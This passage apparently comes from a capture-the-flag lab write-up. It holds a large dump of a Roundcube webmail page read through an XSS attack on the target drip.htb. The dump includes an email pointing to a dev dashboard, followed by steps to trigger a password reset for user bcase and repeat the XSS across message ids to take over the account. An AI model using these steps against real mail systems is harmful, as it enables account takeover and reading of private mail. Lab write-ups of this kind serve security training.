onclick=<span class="string">&quot;return rcmail.command(&#x27;print&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Print&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	&lt;a <span class="built_in">id</span>=<span class="string">&quot;markmessagemenulink&quot;</span> class=<span class="string">&quot;markmessage&quot;</span> title=<span class="string">&quot;Mark messages&quot;</span> data-popup=<span class="string">&quot;markmessage-menu&quot;</span> role=<span class="string">&quot;button&quot;</span> href=<span class="string">&quot;#&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Mark&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	&lt;a <span class="built_in">id</span>=<span class="string">&quot;messagemenulink&quot;</span> class=<span class="string">&quot;more&quot;</span> title=<span class="string">&quot;More actions...&quot;</span> data-popup=<span class="string">&quot;message-menu&quot;</span> role=<span class="string">&quot;button&quot;</span> href=<span class="string">&quot;#&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;More&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;span class=<span class="string">&quot;spacer&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line">		&lt;a class=<span class="string">&quot;prev disabled&quot;</span> title=<span class="string">&quot;Show previous message&quot;</span> data-hidden=<span class="string">&quot;small&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn106&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;previousmessage&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Previous&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">		&lt;a class=<span class="string">&quot;next disabled&quot;</span> title=<span class="string">&quot;Show next message&quot;</span> data-hidden=<span class="string">&quot;small&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn107&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;nextmessage&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;inner&quot;</span>&gt;Next&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;forward-menu&quot;</span> class=<span class="string">&quot;popupmenu&quot;</span>&gt;</span><br><span class="line">	&lt;h3 <span class="built_in">id</span>=<span class="string">&quot;aria-label-forward-menu&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Forwarding options&lt;/h3&gt;</span><br><span class="line">	&lt;ul class=<span class="string">&quot;menu listing&quot;</span> role=<span class="string">&quot;menu&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-forward-menu&quot;</span>&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;forward inline disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn108&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;forward-inline&#x27;,&#x27;sub&#x27;,this,event)&quot;</span>&gt;Forward inline&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;forward attachment disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn109&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;forward-attachment&#x27;,&#x27;sub&#x27;,this,event)&quot;</span>&gt;Forward as attachment&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;forward bounce disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn110&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;bounce&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Resend (bounce)&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;replyall-menu&quot;</span> class=<span class="string">&quot;popupmenu&quot;</span>&gt;</span><br><span class="line">	&lt;h3 <span class="built_in">id</span>=<span class="string">&quot;aria-label-replyall-menu&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Reply-all options&lt;/h3&gt;</span><br><span class="line">	&lt;ul class=<span class="string">&quot;menu listing&quot;</span> role=<span class="string">&quot;menu&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-replyall-menu&quot;</span>&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;reply all disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn111&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;reply-all&#x27;,&#x27;sub&#x27;,this,event)&quot;</span>&gt;Reply all&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;reply list disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn112&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;reply-list&#x27;,&#x27;sub&#x27;,this,event)&quot;</span>&gt;Reply list&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;message-menu&quot;</span> class=<span class="string">&quot;popupmenu&quot;</span>&gt;</span><br><span class="line">	&lt;h3 <span class="built_in">id</span>=<span class="string">&quot;aria-label-message-menu&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;More message actions&lt;/h3&gt;</span><br><span class="line">	&lt;ul class=<span class="string">&quot;menu listing&quot;</span> role=<span class="string">&quot;menu&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-message-menu&quot;</span>&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;print disabled&quot;</span> data-hidden=<span class="string">&quot;small&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn113&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;print&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Print this message&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;download disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn114&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;download&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Export&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;edit asnew disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn115&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;edit&#x27;,&#x27;new&#x27;,this,event)&quot;</span>&gt;Edit as new&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;source disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn116&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;viewsource&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Show <span class="built_in">source</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;move disabled&quot;</span> aria-haspopup=<span class="string">&quot;true&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn117&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;move&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;folder-selector-link&quot;</span>&gt;Move to...&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;copy disabled&quot;</span> aria-haspopup=<span class="string">&quot;true&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn118&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;copy&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;&lt;span class=<span class="string">&quot;folder-selector-link&quot;</span>&gt;Copy to...&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a target=<span class="string">&quot;_blank&quot;</span> class=<span class="string">&quot;extwin disabled&quot;</span> data-hidden=<span class="string">&quot;small&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn119&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;open&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Open <span class="keyword">in</span> new window&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;markmessage-menu&quot;</span> class=<span class="string">&quot;popupmenu&quot;</span>&gt;</span><br><span class="line">	&lt;h3 <span class="built_in">id</span>=<span class="string">&quot;aria-label-markmessage-menu&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Mark selected messages as...&lt;/h3&gt;</span><br><span class="line">	&lt;ul class=<span class="string">&quot;menu listing&quot;</span> role=<span class="string">&quot;menu&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-markmessage-menu&quot;</span>&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;read disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn120&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;mark&#x27;,&#x27;read&#x27;,this,event)&quot;</span>&gt;As <span class="built_in">read</span>&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;unread disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn121&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;mark&#x27;,&#x27;unread&#x27;,this,event)&quot;</span>&gt;As unread&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;flag disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn122&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;mark&#x27;,&#x27;flagged&#x27;,this,event)&quot;</span>&gt;As flagged&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;unflag disabled&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn123&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;mark&#x27;,&#x27;unflagged&#x27;,this,event)&quot;</span>&gt;As unflagged&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;div class=<span class="string">&quot;content frame-content&quot;</span> role=<span class="string">&quot;main&quot;</span>&gt;</span><br><span class="line">		&lt;div <span class="built_in">id</span>=<span class="string">&quot;message-header&quot;</span>&gt;</span><br><span class="line">			&lt;h2 class=<span class="string">&quot;subject&quot;</span>&gt;</span><br><span class="line">				&lt;span class=<span class="string">&quot;voice&quot;</span>&gt;Subject: &lt;/span&gt;</span><br><span class="line">				Analytics Dashboard</span><br><span class="line">				</span><br><span class="line">			&lt;/h2&gt;</span><br><span class="line">			&lt;div class=<span class="string">&quot;header&quot;</span>&gt;</span><br><span class="line">				&lt;img src=<span class="string">&quot;/?_task=addressbook&amp;amp;_action=photo&amp;amp;_email=ebelford%40drip.htb&amp;amp;_error=1&amp;amp;_bgcolor=transparent&quot;</span> alt=<span class="string">&quot;Contact photo&quot;</span> class=<span class="string">&quot;contactphoto&quot;</span> onerror=<span class="string">&quot;this.onerror = null; this.src = &#x27;skins/elastic/images/contactpic.svg&#x27;;&quot;</span>&gt;</span><br><span class="line">				&lt;div class=<span class="string">&quot;header-content&quot;</span>&gt;</span><br><span class="line">					&lt;div class=<span class="string">&quot;header-summary&quot;</span>&gt;&lt;span&gt;From &lt;span class=<span class="string">&quot;adr&quot;</span>&gt;&lt;a href=<span class="string">&quot;mailto:ebelford@drip.htb&quot;</span> class=<span class="string">&quot;rcmContactAddress&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;compose&#x27;,&#x27;ebelford &amp;lt;ebelford@drip.htb&amp;gt;&#x27;,this)&quot;</span> title=<span class="string">&quot;ebelford@drip.htb&quot;</span>&gt;ebelford&lt;/a&gt;&lt;a href=<span class="string">&quot;#add&quot;</span> title=<span class="string">&quot;Add to address book&quot;</span> class=<span class="string">&quot;rcmaddcontact&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;add-contact&#x27;,&#x27;ebelford &amp;lt;ebelford@drip.htb&amp;gt;&#x27;,this)&quot;</span>&gt;&lt;/a&gt;&lt;/span&gt; on &lt;span class=<span class="string">&quot;text-nowrap&quot;</span>&gt;2024-12-24 13:38&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">					&lt;table class=<span class="string">&quot;header-headers&quot;</span>&gt;&lt;tbody&gt;&lt;<span class="built_in">tr</span>&gt;&lt;td class=<span class="string">&quot;header-title&quot;</span>&gt;From&lt;/td&gt;&lt;td class=<span class="string">&quot;header from&quot;</span>&gt;&lt;span class=<span class="string">&quot;adr&quot;</span>&gt;&lt;a href=<span class="string">&quot;mailto:ebelford@drip.htb&quot;</span> class=<span class="string">&quot;rcmContactAddress&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;compose&#x27;,&#x27;ebelford &amp;lt;ebelford@drip.htb&amp;gt;&#x27;,this)&quot;</span> title=<span class="string">&quot;ebelford@drip.htb&quot;</span>&gt;ebelford&lt;/a&gt;&lt;a href=<span class="string">&quot;#add&quot;</span> title=<span class="string">&quot;Add to address book&quot;</span> class=<span class="string">&quot;rcmaddcontact&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;add-contact&#x27;,&#x27;ebelford &amp;lt;ebelford@drip.htb&amp;gt;&#x27;,this)&quot;</span>&gt;&lt;/a&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;<span class="built_in">tr</span>&gt;&lt;td class=<span class="string">&quot;header-title&quot;</span>&gt;To&lt;/td&gt;&lt;td class=<span class="string">&quot;header to&quot;</span>&gt;&lt;span class=<span class="string">&quot;adr&quot;</span>&gt;&lt;a href=<span class="string">&quot;mailto:bcase@drip.htb&quot;</span> class=<span class="string">&quot;rcmContactAddress&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;compose&#x27;,&#x27;bcase@drip.htb&#x27;,this)&quot;</span> title=<span class="string">&quot;bcase@drip.htb&quot;</span>&gt;bcase@drip.htb&lt;/a&gt;&lt;a href=<span class="string">&quot;#add&quot;</span> title=<span class="string">&quot;Add to address book&quot;</span> class=<span class="string">&quot;rcmaddcontact&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;add-contact&#x27;,&#x27;bcase@drip.htb&#x27;,this)&quot;</span>&gt;&lt;/a&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;<span class="built_in">tr</span>&gt;&lt;td class=<span class="string">&quot;header-title&quot;</span>&gt;Date&lt;/td&gt;&lt;td class=<span class="string">&quot;header date&quot;</span>&gt;2024-12-24 13:38&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</span><br><span class="line">					&lt;div class=<span class="string">&quot;header-links&quot;</span>&gt;</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">						&lt;a href=<span class="string">&quot;#headers&quot;</span> class=<span class="string">&quot;headers-summary&quot;</span> onclick=<span class="string">&quot;return UI.headers_show(true)&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">						&lt;a href=<span class="string">&quot;#all-headers&quot;</span> class=<span class="string">&quot;headers-all&quot;</span> onclick=<span class="string">&quot;return UI.headers_dialog()&quot;</span>&gt;Headers&lt;/a&gt;</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">					&lt;/div&gt;</span><br><span class="line">				&lt;/div&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;div <span class="built_in">id</span>=<span class="string">&quot;message-content&quot;</span>&gt;</span><br><span class="line">			&lt;div class=<span class="string">&quot;leftcol&quot;</span> role=<span class="string">&quot;region&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-messageattachments&quot;</span>&gt;</span><br><span class="line">				&lt;h2 <span class="built_in">id</span>=<span class="string">&quot;aria-label-messageattachments&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Attachments&lt;/h2&gt;</span><br><span class="line">				</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">			&lt;div class=<span class="string">&quot;rightcol&quot;</span> role=<span class="string">&quot;region&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-messagebody&quot;</span>&gt;</span><br><span class="line">				&lt;h2 <span class="built_in">id</span>=<span class="string">&quot;aria-label-messagebody&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Message Body&lt;/h2&gt;</span><br><span class="line">				&lt;div <span class="built_in">id</span>=<span class="string">&quot;message-objects&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;remote-objects-message&quot;</span> class=<span class="string">&quot;notice&quot;</span> style=<span class="string">&quot;display: none&quot;</span>&gt;&lt;span&gt;To protect your privacy remote resources have been blocked.&lt;/span&gt;&amp;nbsp;&lt;span class=<span class="string">&quot;boxbuttons&quot;</span>&gt;&lt;a href=<span class="string">&quot;#loadremote&quot;</span> onclick=<span class="string">&quot;rcmail.command(&#x27;load-remote&#x27;)&quot;</span>&gt;Allow&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">				&lt;div <span class="built_in">id</span>=<span class="string">&quot;messagebody&quot;</span>&gt;&lt;div class=<span class="string">&quot;message-part&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;message-part1&quot;</span>&gt;&lt;div class=<span class="string">&quot;pre&quot;</span>&gt;Hey Bryce,&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">The Analytics dashboard is now live. While it&amp;<span class="comment">#039;s still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.&lt;br&gt;</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line">You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you&amp;<span class="comment">#039;ll need to reset your password before logging in.&lt;br&gt;</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line">If you encounter any issues or have feedback, <span class="built_in">let</span> me know so I can address them promptly.&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">Thanks&lt;br&gt;</span><br><span class="line">&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- popup menus --&gt;</span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;attachmentmenu&quot;</span> class=<span class="string">&quot;popupmenu&quot;</span>&gt;</span><br><span class="line">	&lt;h3 <span class="built_in">id</span>=<span class="string">&quot;aria-label-attachmentmenu&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Attachment options&lt;/h3&gt;</span><br><span class="line">	&lt;ul class=<span class="string">&quot;menu listing&quot;</span> role=<span class="string">&quot;menu&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-attachmentmenu&quot;</span>&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a <span class="built_in">id</span>=<span class="string">&quot;attachmenuopen&quot;</span> class=<span class="string">&quot;extwin disabled&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;open-attachment&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Open&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a <span class="built_in">id</span>=<span class="string">&quot;attachmenudownload&quot;</span> class=<span class="string">&quot;download disabled&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span> onclick=<span class="string">&quot;return rcmail.command(&#x27;download-attachment&#x27;,&#x27;&#x27;,this,event)&quot;</span>&gt;Download&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;mailto-menu&quot;</span> class=<span class="string">&quot;popupmenu&quot;</span>&gt;</span><br><span class="line">	&lt;h3 <span class="built_in">id</span>=<span class="string">&quot;aria-label-mailtomenu&quot;</span> class=<span class="string">&quot;voice&quot;</span>&gt;Email address options&lt;/h3&gt;</span><br><span class="line">	&lt;ul class=<span class="string">&quot;menu listing&quot;</span> role=<span class="string">&quot;menu&quot;</span> aria-labelledby=<span class="string">&quot;aria-label-mailtomenu&quot;</span>&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;addressbook&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn124&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span>&gt;Add to address book&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		&lt;li role=<span class="string">&quot;menuitem&quot;</span>&gt;&lt;a class=<span class="string">&quot;compose&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;rcmbtn125&quot;</span> role=<span class="string">&quot;button&quot;</span> tabindex=<span class="string">&quot;-1&quot;</span> aria-disabled=<span class="string">&quot;true&quot;</span> href=<span class="string">&quot;#&quot;</span>&gt;Compose mail to&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div <span class="built_in">id</span>=<span class="string">&quot;messagestack&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">$(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">rcmail.init();</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script src=<span class="string">&quot;skins/elastic/deps/bootstrap.bundle.min.js?s=1716107245&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;skins/elastic/ui.min.js?s=1716107237&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
</details>

<p>And we can see this message in it:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you&amp;#039;ll need to reset your password before logging in.</span><br></pre></td></tr></table></figure></div>

<p>Weâ€™ve got a new endpoint to access <a class="link"   target="_blank" rel="noopener" href="http://dev-a3f1-01.drip.htb/" >http://dev-a3f1-01.drip.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>As per the message, we can reset the password. The steps are as follows:</p>
<ul>
<li>go to <a class="link"   target="_blank" rel="noopener" href="http://dev-a3f1-01.drip.htb/forgot" >http://dev-a3f1-01.drip.htb/forgot <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>enter <a class="link"   href="mailto:&#98;&#99;&#97;&#115;&#101;&#64;&#100;&#x72;&#105;&#112;&#x2e;&#104;&#x74;&#98;" >&#98;&#99;&#97;&#115;&#101;&#64;&#100;&#x72;&#105;&#112;&#x2e;&#104;&#x74;&#98; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> email and spam it</li>
<li>spam the xss attack for different uids (from 2 to 6 for example) (uid is the id of the email) (I find it on uid 5)</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: bcase</span><br><span class="line">password: new_password</span><br></pre></td></tr></table></figure></div>

